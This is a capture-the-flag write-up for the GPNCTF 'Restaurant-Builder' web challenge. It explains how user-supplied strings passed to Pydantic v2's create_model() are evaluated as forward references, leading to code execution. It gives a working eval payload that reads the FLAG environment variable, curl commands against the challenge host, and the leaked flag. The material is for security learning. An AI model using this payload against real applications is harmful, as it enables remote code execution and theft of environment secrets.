GPNCTF - Restaurant-Builder Writeup

Challenge Info

Category: Web

Tech Stack: Python, FastAPI, Pydantic v2

Vulnerability Analysis

The vulnerability exists in the /blueprint/{name} POST endpoint, where the application dynamically generates a Pydantic model based on user input.

@app.post("/blueprint/{name}")
def register_blueprint(name: str, description: Dict[str,str] = Body()):
    # ...
    description = {k: v for k,v in description.items() if not k.startswith("__")}
    Blueprint = create_model(name, **description)
    blueprints[name] = Blueprint


In Pydantic v2, if you pass a string value as a keyword argument to create_model(), it treats the string as a Forward Reference (a type annotation), not a default value.

When the user requests the blueprint via the GET /blueprint/{name} endpoint, the application calls:

@app.get("/blueprint/{name}")
def get_blueprint(name: str):
    # ...
    return blueprint.model_json_schema()


During model_json_schema() execution, Pydantic attempts to resolve the un-evaluated forward reference by passing the string to Python's internal eval(). This results in Remote Code Execution (RCE).

Exploit Strategy

The Dockerfile shows the flag is stored in the environment variable FLAG.

To extract the flag without a reverse shell, we can embed our OS command within a typing.Literal type hint. When eval() processes the string, it fetches the environment variable, and Pydantic sets the literal's value as a const field in the resulting JSON schema.

Payload:

__import__("typing").Literal[__import__("os").environ.get("FLAG")]


Execution

1. Inject the payload
Register a new blueprint with the payload as the field value.

curl -s -X POST https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag \
-H "Content-Type: application/json" \
-d '{"bocor": "__import__(\"typing\").Literal[__import__(\"os\").environ.get(\"FLAG\")]"}'


2. Trigger evaluation and leak the flag
Send a GET request to invoke model_json_schema() and retrieve the evaluated schema.

curl -s https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag


Resulting Output:

{"properties":{"bocor":{"const":"GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}","title":"Bocor","type":"string"}},"required":["bocor"],"title":"GetFlag","type":"object"}


Flag: GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}
